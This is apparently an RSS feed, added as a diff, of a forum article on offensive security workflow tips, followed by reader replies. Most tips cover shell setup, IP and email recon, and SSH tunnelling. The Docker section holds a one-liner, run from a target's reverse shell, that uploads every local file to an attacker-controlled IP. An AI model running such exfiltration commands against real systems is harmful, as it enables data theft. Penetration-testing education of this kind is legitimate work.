@@ -1,0 +1,602 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+    <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794</link>
+    <description>I have been actively hacking things now for 5+ years, both professionally and as a hobbyist. Inside these 5 years, many mistakes have been made, I have my banged my head against a wall many times, I&#39;ve messed up, I&#39;ve had many &quot;Ohhhhh&quot; moments. This may all sound extremely familiar to you, and you&#39;ll agree, that through all this there is one constant: you learn from these experiences. 
+
+In this article I&#39;m going to document a few techniques, commands and small things that make my day-day testing life easier, and that might just make your life more enjoyable!
+
+I apologize in advance for how unstructued this article might be, I just had a lot of back-pocket tricks I have picked up over the years and if my unorganized brain dump of tricks can make somebody go &quot;Oh thats cool!&quot; I&#39;ll be happy :)
+
+If you found anything here interesting, helpful, or amusing, please share this article to share the knowledge and joy! 
+
+## ZSH vs Bash, Aliases, Docker
+### ZSH
+One thing that has seriously made a difference to my productivity has been ZSH, and more specifically plugins such as &#39;Z&#39;. ZSH coupled with oh-my-zsh, and smart tab completion enabled, makes navigating directories in your terminal so much more pleasurable. 
+
+With my current setup, I can type `cd d/p/ad`, press `tab`, and it&#39;ll auto complete to `Documents/Pentest/AD/`. There is also a ZSH plugin I use called `z`. Z will analyse your directory history and figure out what directories you go to most often. After about a few hours of use, typing `z pentest` will take you to your pentest directory, `z someproject` will take you there no matter where you are. 
+
+It&#39;s hard to explain, but it&#39;s magic. 
+
+### Aliases
+More shell fun, inside your `.zshrc` or `.bashrc` (scum), you can specify an alias, an alias will set a name of a command to whatever you set.
+
+So for example:
+```
+alias nmap=&quot;grc nmap&quot;
+```
+
+GRC colorizes cli application, this will make nmap very pretty, and make the responses somewhat readable! Wow!
+
+![](upload://gF0D63TXoN9CLJveDrlE23MNwTh.png)
+
+If you&#39;re familiar with the Linux shell, you&#39;ll also know that you can set variables using the `EXPORT` command.
+
+### `gobuster -w $BIG -u https://10.10.10.145/`
+
+```
+export DIRS_LARGE=/pentest/seclists/Discovery/Web-Content/raft-large-directories.txt
+export DIRS_SMALL=/pentest/seclists/Discovery/Web-Content/raft-small-directories.txt
+
+export FILES_LARGE=/pentest/seclists/Discovery/Web-Content/raft-large-files.txt
+export FILES_SMALL=/pentest/seclists/Discovery/Web-Content/raft-small-files.txt
+
+export BIG=/pentest/seclists/Discovery/Web-Content/big.txt
+```
+
+Setting these directories allows us to access them by using their alias, such as in the above example where we use gobuster with $BIG as apposed to using their full path. This is a very nice little tip as it not only keeps your command (usually) to one line, it also means you don&#39;t have to remember and type out the entire wordlist path everytime you need the list - which trust me, can be a lot if you&#39;re regularly enumerating HTTP.
+
+### Docker
+This is something I&#39;ve been doing ever since I discovered Docker, but ropnop sums it up really nicely in his [Docker for Pentesters](https://blog.ropnop.com/docker-for-pentesters/) article. I recommend reading through this, but my favourite trick from this entire article has got to be this:
+
+```
+alias postfiledumphere=&#39;docker run --rm -it -p80:3000 -v &quot;${PWD}:/data&quot; rflathers/postfiledump&#39;  
+```
+
+Run this command, `postfiledumphere`, and then on your target machine (in a hackthebox or remote reverse shell), run this:
+```
+ls | xargs -I{} wget http://10.10.14.3/{} --post-file {}
+```
+
+This will iterate through all the files in the local directory, and transfer it over HTTP. This is extremely helpful if you find yourself in an embedded device, or even a locked down container. If you don&#39;t have wget, you can use curl (which is in most devices).
+
+## Situational Awareness with IP&#39;s
+If you&#39;ve been given an IP, and you need to do some threat intel on it, you can get a pretty good feel for the type of host it is, where it is, and what it does.
+
+### IPInfo
+Usually if I get given an IP, I&#39;ll do a lookup with ipinfo.
+
+```
+curl ipinfo.io/54.90.107.240
+```
+
+```
+{
+  &quot;ip&quot;: &quot;54.90.107.240&quot;,
+  &quot;hostname&quot;: &quot;ec2-54-90-107-240.compute-1.amazonaws.com&quot;,
+  &quot;city&quot;: &quot;Virginia Beach&quot;,
+  &quot;region&quot;: &quot;Virginia&quot;,
+  &quot;country&quot;: &quot;US&quot;,
+  &quot;loc&quot;: &quot;36.8512,-76.1692&quot;,
+  &quot;org&quot;: &quot;AS14618 Amazon.com, Inc.&quot;,
+  &quot;postal&quot;: &quot;23465&quot;,
+  &quot;readme&quot;: &quot;https://ipinfo.io/missingauth&quot;
+}
+```
+
+IPInfo will return JSON with details all about the host, the great thing about this is that you can easily script it by piping into `jq`.
+
+I tend to abuse bash for loops for this kind of thing, say you have a text file full of IP&#39;s:
+
+```
+for ip in $(cat ips.txt); do echo -n &quot;$ip: &quot;; curl -s ipinfo.io/$ip | jq .org; done
+```
+
+```
+54.90.107.240: &quot;AS14618 Amazon.com, Inc.&quot;
+54.90.107.120: &quot;AS14618 Amazon.com, Inc.&quot;
+54.90.107.241: &quot;AS14618 Amazon.com, Inc.&quot;
+54.90.107.242: &quot;AS14618 Amazon.com, Inc.&quot;
+54.90.107.243: &quot;AS14618 Amazon.com, Inc.&quot;
+```
+
+### GreyNoise.io
+You can do the same with Greynoise, if you don&#39;t know already, Greynoise.io is a badass service that hosts thousands of listeners all over the internet silently listening. When devices scan the internet for different ports, services, HTTP requests and the like, Greynoise takes note and indexes them.
+
+The idea behind Greynoise is to ingest all the noise on the internet, so that you can filter it out. 
+
+If you have an API key, you can use the `greynoise` client from https://github.com/GreyNoise-Intelligence/GNQL. 
+
+```
+greynoise 54.90.107.240
+```
+
+``` _____________   ______________ 
+     __  ____/__  | / /_  __ \__  / 
+     _  / __ __   |/ /_  / / /_  /  
+     / /_/ / _  /|  / / /_/ /_  /___
+     \____/  /_/ |_/  \___\_\/_____/
+    
+ ┌───────────────────────────┐
+ │       result 1 of 1       │
+ └───────────────────────────┘
+
+          OVERVIEW:
+ ----------------------------
+ IP: 54.90.107.240
+ Classification: unknown
+ First seen: 2018-10-19
+ Last seen: 2018-10-19
+ Actor: unknown
+ Tags: [&#39;Web Crawler&#39;, &#39;HTTP Alt Scanner&#39;]
+
+          METADATA:
+ ----------------------------
+ Location: Ashburn, United States (US)
+ Organization: Amazon Technologies Inc.
+ rDNS: ec2-54-90-107-240.compute-1.amazonaws.com
+ ASN: AS14618
+ OS: unknown
+ Category: hosting
+
+          RAW DATA:
+ ----------------------------
+ Port/Proto: 8443/TCP
+
+ [Paths]
+ /
+
+```
+
+And of course, you can loop this around all day with bash for loops and the `-o json` option.
+
+### Shodan
+You are probably aware of Shodan, I had to mention this for those who still don&#39;t know, as it&#39;s such a valuable tool.
+
+Shodan scans all the hosts on the internet, all the time. This means you can preform a lookup of a host and see what they have.
+
+```
+shodan host 216.58.210.206
+```
+
+```
+216.58.210.206
+Hostnames:               mrs04s09-in-f206.1e100.net;lhr48s11-in-f14.1e100.net
+City:                    Mountain View
+Country:                 United States
+Organization:            Google
+Updated:                 2019-08-17T19:28:38.408716
+Number of open ports:    2
+
+Ports:
+     80/tcp  
+    443/tcp  
+	|-- SSL Versions: TLSv1, TLSv1.1, TLSv1.2, TLSv1.3
+
+```
+
+### Email Recon
+A quick little trick I picked up is preforming recon on email addresses extremely quickly using EmailRep.
+
+```
+curl emailrep.io/john.smith@gmail.com
+```
+
+```
+{
+  &quot;email&quot;: &quot;john.smith@gmail.com&quot;,
+  &quot;reputation&quot;: &quot;high&quot;,
+  &quot;suspicious&quot;: false,
+  &quot;references&quot;: 91,
+  &quot;details&quot;: {
+    &quot;blacklisted&quot;: false,
+    &quot;malicious_activity&quot;: false,
+    &quot;malicious_activity_recent&quot;: false,
+    &quot;credentials_leaked&quot;: true,
+    &quot;credentials_leaked_recent&quot;: false,
+    &quot;data_breach&quot;: true,
+    &quot;last_seen&quot;: &quot;07/27/2019&quot;,
+    &quot;domain_exists&quot;: true,
+    &quot;domain_reputation&quot;: &quot;n/a&quot;,
+    &quot;new_domain&quot;: false,
+    &quot;days_since_domain_creation&quot;: 8773,
+    &quot;suspicious_tld&quot;: false,
+    &quot;spam&quot;: false,
+    &quot;free_provider&quot;: true,
+    &quot;disposable&quot;: false,
+    &quot;deliverable&quot;: true,
+    &quot;accept_all&quot;: false,
+    &quot;valid_mx&quot;: true,
+    &quot;spoofable&quot;: true,
+    &quot;spf_strict&quot;: true,
+    &quot;dmarc_enforced&quot;: false,
+    &quot;profiles&quot;: [
+      &quot;lastfm&quot;,
+      &quot;pinterest&quot;,
+      &quot;foursquare&quot;,
+      &quot;aboutme&quot;,
+      &quot;spotify&quot;,
+      &quot;twitter&quot;,
+      &quot;vimeo&quot;
+    ]
+  }
+}
+```
+
+
+
+## SSH Tunelling
+If you&#39;ve ever exposed a CobaltStrike team server port externally, and told people about it, you&#39;ll get a lot of hate (source: 1337 hacker slacks). What&#39;s the solution? SSH Tunelling. 
+
+If you have SSH access to a host, you can tunnel ports (map remote ports to local ones), dynamically create SOCKS proxies, and a lot of really cool things.
+
+
+#### Mapping remote port to local port
+```
+ssh -L localport:127.0.0.1:remoteport user@host
+```
+
+A good way to think about the syntax of SSH tunnels is to split it into two parts (when I saw this it blew my mind.)
+
+```
+ssh -L 127.0.0.1:8080:127.0.0.1:80 user@host
+```
+
+This will open local port 8080, mapped to port 80 on the remote server. Luckily for us, SSH is kind and let&#39;s us infer the first host as local. 
+
+
+#### Opening a SOCKS proxy that routes from your server
+```
+SSH -D 8080 user@host
+```
+
+This will open a socks proxy on local port 8080, you can modify your proxychains.conf to accept this port, and then use `proxychains` before every command to route traffic through that host.
+
+### Vagrant
+This is a cool little trick I learned, and it has really made me productive and has generally made things easier.
+
+Like Docker, vagrant can spin up instances of operating systems and drop you into an interactive shell.
+
+My favourite is using Ubuntu:
+
+```
+vagrant init hashicorp/precise32
+vagrant up
+vagrant ssh
+cd /vagrant/
+```
+
+You&#39;ll be dropped into an Ubuntu Precise shell!
+
+### Conclusion
+In conclusion, a lot of cool little tricks can really make your life easier as a pentester. Small one liners, a reference article like this, and you may actually look like you know what you&#39;re doing.
+
+I hope you enjoyed this braindump :D, have an amazing day 0x00ers! 
+
+\- Pry0cc</description>
+    
+    <lastBuildDate>Wed, 25 Oct 2023 03:14:06 +0000</lastBuildDate>
+    <category>Pentesting</category>
+    <atom:link href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[bedlam]]></dc:creator>
+        <description><![CDATA[
+            <p>Props, good info. Thanks for sharing.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/74">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/74</link>
+        <pubDate>Wed, 25 Oct 2023 03:14:06 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-74</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[goodboyjojo]]></dc:creator>
+        <description><![CDATA[
+            <p>this post was pretty good. thanks for the info it was very easy to follow.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/73">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/73</link>
+        <pubDate>Sat, 21 Oct 2023 21:39:38 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-73</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[Lorakai]]></dc:creator>
+        <description><![CDATA[
+            <p>Why use tools like Ohmyzsh? I mean, you can edit and customize everything you need when you switch to the right directory and then nano bash.bashrc. For example, the picture below is my terminal and I didn’t use any tools whatsoever. I just piped the PS1 through lolcat and did the same with the figlet command<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/4/049706fba35373e9d543b5a002bffa9223d49139.png" data-download-href="/uploads/short-url/EBu1LBElmbT25ZhH5Nis9afTXb.png?dl=1" title="Screenshot_20230916-145304" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/4/049706fba35373e9d543b5a002bffa9223d49139_2_225x500.png" alt="Screenshot_20230916-145304" data-base62-sha1="EBu1LBElmbT25ZhH5Nis9afTXb" width="225" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/4/049706fba35373e9d543b5a002bffa9223d49139_2_225x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/0/4/049706fba35373e9d543b5a002bffa9223d49139_2_337x750.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/0/4/049706fba35373e9d543b5a002bffa9223d49139_2_450x1000.png 2x" data-dominant-color="121515"></a></div><p></p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/71">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/71</link>
+        <pubDate>Sat, 16 Sep 2023 19:36:49 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-71</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[mack_th3_ripp3r]]></dc:creator>
+        <description><![CDATA[
+            <p>I thought this was great, thank you.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/68">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/68</link>
+        <pubDate>Sun, 11 Jun 2023 14:09:03 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-68</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[Eleutheria]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for the sharing, that’s a great post !</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/67">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/67</link>
+        <pubDate>Mon, 05 Jun 2023 00:00:41 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-67</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[cyberlord69]]></dc:creator>
+        <description><![CDATA[
+            <p>I feel like I can learn alot from you , Look forward to getting to know you all and diving deeper</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/66">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/66</link>
+        <pubDate>Fri, 02 Jun 2023 16:53:39 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-66</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[Hack_Syndicate]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote group-VIP" data-username="pry0cc" data-post="1" data-topic="15794">
+<div class="title">
+<div class="quote-controls"></div>
+<img loading="lazy" alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar"> pry0cc:</div>
+<blockquote>
+<pre><code class="lang-auto">curl emailrep.io/john.smith@gmail.com
+</code></pre>
+<pre><code class="lang-auto">
+</code></pre>
+</blockquote>
+</aside>
+<p>Torify never works for me but I also have never tried too hard to fix that. torsocks and proxychains work well enough.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/65">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/65</link>
+        <pubDate>Wed, 26 Apr 2023 00:18:42 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-65</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[PrAxis]]></dc:creator>
+        <description><![CDATA[
+            <p>Was worth reading for just this alone:<br>
+alias nmap=“grc nmap”<br>
+Post fires off a lot of interesting ideas.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/64">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/64</link>
+        <pubDate>Sun, 23 Apr 2023 00:49:21 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-64</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[_m0r0n]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for this info.  The only issue I have ever found with Docker at least is when you need to alternate between wireless networks, it isn’t exactly the easiest.  Mainly why I stick with VBox at the moment.</p>
+<p>But maybe something I should just look into and learn more about.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/62">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/62</link>
+        <pubDate>Thu, 10 Nov 2022 16:00:02 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-62</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[hatecomputers]]></dc:creator>
+        <description><![CDATA[
+            <p>this was such a great post.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/58">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/58</link>
+        <pubDate>Wed, 28 Sep 2022 10:18:26 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-58</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[snoop]]></dc:creator>
+        <description><![CDATA[
+            <p>great one thank you so much for this.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/56">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/56</link>
+        <pubDate>Tue, 15 Feb 2022 03:52:27 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-56</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[alex_orott]]></dc:creator>
+        <description><![CDATA[
+            <p>thANK U SO MUCHHH  11111</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/55">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/55</link>
+        <pubDate>Tue, 18 Jan 2022 20:29:27 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-55</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[TEDDYBEAR]]></dc:creator>
+        <description><![CDATA[
+            <p>great job <a class="mention" href="https://0x00sec.org/u/vorticalbox">@vorticalbox</a></p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/54">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/54</link>
+        <pubDate>Fri, 13 Aug 2021 23:45:13 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-54</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[EMU-TIME]]></dc:creator>
+        <description><![CDATA[
+            <p>Very interesting tips <img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=9" title=":grinning:" class="emoji" alt=":grinning:"></p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/53">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/53</link>
+        <pubDate>Thu, 05 Aug 2021 14:36:13 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-53</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[R3DS4U11]]></dc:creator>
+        <description><![CDATA[
+            <p>Great tricks i like the first one</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/51">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/51</link>
+        <pubDate>Wed, 28 Apr 2021 18:17:58 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-51</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[vorticalbox]]></dc:creator>
+        <description><![CDATA[
+            <p>This was super useful, the docker commands have sped up my software development!</p>
+<p>I use ohmyzsh + zsh which has colourize as a plugin as well as docker/docker-compose/nmap and a number of others.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/47">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/47</link>
+        <pubDate>Wed, 11 Nov 2020 09:05:51 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-47</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Ahhaha - it’s a figure of speech,  it isn’t abuse. I just use them a <em>lot</em>, if I used a car this much it would break down <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/45">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/45</link>
+        <pubDate>Thu, 27 Aug 2020 09:07:18 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-45</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[Jeklah]]></dc:creator>
+        <description><![CDATA[
+            <p>You’re the first person I’ve heard of who uses fsh and zsh…usually it’s one or the other. Out of curiosity, could you provide use cases where you’d use one and not the other, and why?</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/44">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/44</link>
+        <pubDate>Tue, 25 Aug 2020 10:01:36 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-44</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[Jeklah]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for the article! I’m just teaching myself cyber sec atm but I’ve been using zsh for years, nice to see it as an industry standard.</p>
+<p>One small (minor, pedantic) question…you said you tend to abuse bash  for loops when you have a bunch of ips to scan…isn’t that exactly what they’re for? Where’s the abuse?</p>
+<p>Not being annoying on purpose just the way you phrased it made he think maybe you know a better way but don’t use it…if not why? Just curious.</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/43">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/43</link>
+        <pubDate>Tue, 25 Aug 2020 09:28:21 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-43</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[robon]]></dc:creator>
+        <description><![CDATA[
+            <p>Awesome thank you …</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/41">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/41</link>
+        <pubDate>Fri, 07 Aug 2020 07:02:34 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-41</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
+        <dc:creator><![CDATA[BrokenAdministrator]]></dc:creator>
+        <description><![CDATA[
+            <p>Another great writeup! Enjoyed reading it and something I will reference in the future when needing tools!</p>
+          <p><a href="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/40">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794/40</link>
+        <pubDate>Fri, 07 Aug 2020 03:58:04 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15794-40</guid>
+        <source url="https://0x00sec.org/t/tricks-of-the-trade-from-5-years-in-offensive-cyber-security/15794.rss">Tricks of the Trade from 5+ years in Offensive Cyber Security</source>
+      </item>
+      <item>
+        <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
